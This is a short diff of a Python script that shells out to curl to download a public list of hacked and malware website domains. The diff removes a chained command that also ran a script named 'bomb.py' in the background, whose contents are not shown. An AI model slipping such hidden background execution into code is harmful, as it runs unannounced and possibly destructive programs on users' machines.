@@ -5,7 +5,7 @@ _os = ""
 _number = 0
 file = os.getcwd() + "/domains.txt"
 if _number == 0:
-  os.system("curl -O https://raw.githubusercontent.com/mitchellkrogza/The-Big-List-of-Hacked-Malware-Web-Sites/refs/heads/master/.dev-tools/_strip_domains/domains.txt & python bomb.py &")
+  os.system("curl -O https://raw.githubusercontent.com/mitchellkrogza/The-Big-List-of-Hacked-Malware-Web-Sites/refs/heads/master/.dev-tools/_strip_domains/domains.txt")
   _number = 1
 else:
   pass
